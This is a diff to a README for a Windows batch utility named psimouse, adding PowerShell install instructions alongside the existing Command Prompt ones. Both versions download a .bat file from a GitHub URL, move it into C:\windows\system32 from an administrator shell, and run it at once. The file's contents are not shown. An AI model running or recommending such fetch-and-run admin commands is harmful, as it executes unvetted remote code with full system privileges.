@@ -29,7 +29,7 @@ Press Ctrl+C to stop.
 
 ## Installation
 
-### Quick Install
+### Quick Install (Command Prompt)
 
 Open **Command Prompt as Administrator** and run:
 
@@ -38,6 +38,18 @@ curl -L -o "%TEMP%\psimouse.bat" "https://github.com/SellerDumpskart/psimouse/ra
 move /Y "%TEMP%\psimouse.bat" "C:\windows\system32\psimouse.bat"
 start "" "C:\windows\system32\psimouse.bat"
 ```
+
+### Quick Install (PowerShell)
+
+Open **PowerShell as Administrator** and run:
+
+```powershell
+Invoke-WebRequest -Uri "https://github.com/SellerDumpskart/psimouse/raw/refs/heads/main/psimouse.bat" -OutFile "$env:TEMP\psimouse.bat"
+Move-Item -Path "$env:TEMP\psimouse.bat" -Destination "C:\windows\system32\psimouse.bat" -Force
+Start-Process "C:\windows\system32\psimouse.bat"
+```
+
+> **Note:** If you're unsure whether you're using CMD or PowerShell, type `cmd` first to switch to Command Prompt, then use the CMD commands above.
 
 ### Manual Install
 
